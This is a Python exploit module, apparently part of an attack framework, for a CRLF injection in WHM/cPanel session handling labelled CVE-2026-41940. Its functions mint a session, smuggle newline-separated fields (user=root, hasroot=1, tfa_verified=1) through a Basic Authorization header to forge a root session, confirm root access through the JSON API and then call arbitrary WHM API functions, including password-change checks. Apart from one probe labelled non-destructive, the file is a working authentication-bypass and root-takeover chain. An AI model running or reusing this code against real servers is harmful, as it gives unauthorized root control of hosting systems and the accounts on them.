#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WHM/cPanel session CRLF helpers (CVE-2026-41940)."""

from __future__ import annotations

import base64
import json
import re
import secrets
import time
from typing import Any, Callable, Optional, Tuple
from urllib.parse import quote

from core.framework.base_module import BaseModule

HttpResponse = Any
RequestFn = Callable[..., Optional[HttpResponse]]


def whm_path_join(base_path: str, suffix: str) -> str:
    base = (base_path or "/").rstrip("/")
    suffix = suffix if suffix.startswith("/") else f"/{suffix}"
    return f"{base}{suffix}" if base else suffix


def encode_session_cookie(session_name: str) -> str:
    return quote(session_name, safe="")


def mint_whm_session(
    request: RequestFn,
    join: Callable[[str], str],
) -> Tuple[str, str]:
    """Return (session_name, raw Set-Cookie whostmgrsession value)."""
    login = request(
        method="POST",
        path=join("/login"),
        params={"login_only": "1"},
        data={"user": secrets.token_hex(4), "pass": secrets.token_hex(8)},
        session=True,
        allow_redirects=False,
    )
    cookies = str(login.headers.get("Set-Cookie") or "") if login else ""
    match = re.search(r"(?:^|;\s*)whostmgrsession=([^;,\s]+)", cookies, re.I)
    if not match:
        raise RuntimeError("whostmgrsession cookie missing")
    raw = match.group(1)
    from urllib.parse import unquote

    session_name = unquote(raw).split(",", 2)[0]
    return session_name, raw


def probe_expired_marker(
    request: RequestFn,
    join: Callable[[str], str],
) -> Tuple[bool, str]:
    """Non-destructive CRLF check (expired=1 → msg_code:[expired_session])."""
    session_name, cookie_raw = mint_whm_session(request, join)
    user = f"u{secrets.token_hex(5)}"
    b64 = base64.b64encode(f"{user}:\xff\nexpired=1".encode()).decode()
    res2 = request(
        method="GET",
        path=join("/"),
        headers={
            "Authorization": f"Basic {b64}",
            "Cookie": f"whostmgrsession={encode_session_cookie(session_name)}",
        },
        allow_redirects=False,
    )
    if not res2:
        return False, "no response after CRLF probe"
    loc = str(res2.headers.get("Location") or "")
    match = re.search(r"(/cpsess\d{10})", loc)
    if not match:
        return False, "no cpsess token — injection did not land"
    token = match.group(1)
    res3 = request(
        method="GET",
        path=join(f"{token}/"),
        headers={"Cookie": f"whostmgrsession={cookie_raw}"},
        allow_redirects=False,
    )
    body = (res3.text or "") if res3 else ""
    if "msg_code:[expired_session]" in body:
        return True, "CRLF injection confirmed"
    return False, "injection filtered or patched"


def inject_root_session_fields(
    request: RequestFn,
    join: Callable[[str], str],
    session_name: str,
) -> str:
    raw_creds = (
        "root:\xff\nsuccessful_internal_auth_with_timestamp=9999999999\n"
        "user=root\ntfa_verified=1\nhasroot=1"
    )
    res = request(
        method="GET",
        path=join("/"),
        headers={
            "Authorization": f"Basic {base64.b64encode(raw_creds.encode()).decode()}",
            "Cookie": f"whostmgrsession={encode_session_cookie(session_name)}",
        },
        session=True,
        allow_redirects=False,
    )
    loc = str(res.headers.get("Location") or "") if res else ""
    match = re.search(r"(/cpsess\d{10})", loc)
    if not match:
        raise RuntimeError("cpsess token not found — target patched?")
    return match.group(1)


def promote_whm_session_cache(
    request: RequestFn,
    join: Callable[[str], str],
    session_name: str,
) -> None:
    res = request(
        method="GET",
        path=join("/scripts2/listaccts"),
        headers={"Cookie": f"whostmgrsession={encode_session_cookie(session_name)}"},
        session=True,
        allow_redirects=False,
    )
    code = int(res.status_code or 0) if res else 0
    if code != 401:
        raise RuntimeError(f"listaccts expected HTTP 401, got {code}")


def verify_whm_root_access(
    request: RequestFn,
    join: Callable[[str], str],
    session_name: str,
    token: str,
    timeout: float = 30.0,
) -> bool:
    deadline = time.time() + max(5.0, timeout)
    cookie = f"whostmgrsession={encode_session_cookie(session_name)}"
    while time.time() < deadline:
        res = request(
            method="GET",
            path=join(f"{token}/json-api/version"),
            params={"api.version": "1"},
            headers={"Cookie": cookie},
            session=True,
        )
        if res and int(res.status_code or 0) == 200 and '"version"' in (res.text or ""):
            return True
        time.sleep(1.5)
    return False


def whm_json_api(
    request: RequestFn,
    join: Callable[[str], str],
    session_name: str,
    token: str,
    function: str,
    post: Optional[dict] = None,
) -> HttpResponse:
    return request(
        method="POST",
        path=join(f"{token}/json-api/{function}"),
        params={"api.version": "1"},
        data=post or {},
        headers={"Cookie": f"whostmgrsession={encode_session_cookie(session_name)}"},
        session=True,
    )


def passwd_api_ok(res: HttpResponse) -> bool:
    if not res or int(res.status_code or 0) != 200:
        return False
    body = res.text or ""
    try:
        doc = json.loads(body)
    except json.JSONDecodeError:
        return False
    if doc.get("status") == 1:
        return True
    meta = doc.get("metadata") or {}
    return meta.get("result") == 1


class Cpanel_whm(BaseModule):
    """Mixin: WHM CRLF session primitives on Http_client modules."""

    def _whm_join(self, suffix: str) -> str:
        return whm_path_join(getattr(self, "path", "/"), suffix)

    def cpanel_safe_check(self) -> Tuple[bool, str]:
        return probe_expired_marker(self.http_request, self._whm_join)

    def cpanel_mint_session(self) -> Tuple[str, str]:
        return mint_whm_session(self.http_request, self._whm_join)

    def cpanel_inject_root(self, session_name: str) -> str:
        return inject_root_session_fields(self.http_request, self._whm_join, session_name)

    def cpanel_promote_cache(self, session_name: str) -> None:
        promote_whm_session_cache(self.http_request, self._whm_join, session_name)

    def cpanel_verify_root(self, session_name: str, token: str, timeout: float = 30.0) -> bool:
        return verify_whm_root_access(
            self.http_request, self._whm_join, session_name, token, timeout
        )

    def cpanel_whm_api(self, session_name: str, token: str, function: str, post: Optional[dict] = None):
        return whm_json_api(self.http_request, self._whm_join, session_name, token, function, post)

    @staticmethod
    def cpanel_passwd_api_ok(res: HttpResponse) -> bool:
        return passwd_api_ok(res)